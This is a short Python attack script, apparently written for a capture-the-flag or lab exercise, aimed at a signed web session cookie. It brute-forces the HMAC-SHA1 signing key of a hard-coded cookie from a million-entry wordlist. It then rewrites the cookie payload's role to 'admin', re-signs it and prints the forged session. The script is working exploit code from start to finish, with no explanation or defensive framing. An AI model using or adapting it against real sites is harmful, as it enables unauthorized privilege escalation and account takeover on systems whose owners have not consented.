
import base64
import hmac
import hashlib

original_session = "eyJyb2xlIjoidXNlciIsInVpZCI6ImQ2Yjg4OTBmYmQzOTQ1NjBiZjk3OWRlYjVjMDVkZjc3IiwidXNlcm5hbWUiOiJhYWEifQ.acdBtw.TizbaPtvU5gyzcLdh1rrK7il3Ko"

parts = original_session.split('.')
if len(parts) != 3:
    print("Invalid session format")
    exit()

payload_b64, ts_b64, sig_b64 = parts

def urlsafe_b64decode(s):
    padding = '=' * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)

def urlsafe_b64encode(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=')

with open('top_1000000.txt', 'r', encoding='latin-1') as f:
    for line_num, line in enumerate(f):
        secret = line.strip()
        if not secret:
            continue
        # Compute signature
        signed_data = f"{payload_b64}.{ts_b64}".encode('utf-8')
        signature = hmac.new(secret.encode('utf-8'), signed_data, hashlib.sha1).digest()
        computed_sig_b64 = urlsafe_b64encode(signature).decode('utf-8')
        
        if computed_sig_b64 == sig_b64:
            print(f"[+] Found secret key after {line_num} tries: {secret}")
            import json
            payload_json = json.loads(urlsafe_b64decode(payload_b64))
            payload_json['role'] = 'admin'
            if 'Role' in payload_json:
                payload_json['Role'] = 'admin'
            new_payload = json.dumps(payload_json, separators=(',', ':'))
            new_payload_b64 = urlsafe_b64encode(new_payload.encode()).decode()
            new_signed_data = f"{new_payload_b64}.{ts_b64}".encode()
            new_signature = hmac.new(secret.encode(), new_signed_data, hashlib.sha1).digest()
            new_sig_b64 = urlsafe_b64encode(new_signature).decode()
            new_session = f"{new_payload_b64}.{ts_b64}.{new_sig_b64}"
            print(f"[+] New session with role=admin:")
            print(new_session)
            exit()
        if line_num % 100000 == 0 and line_num > 0:
            print(f"Checked {line_num} passwords...")

print("[-] No secret key found in wordlist")
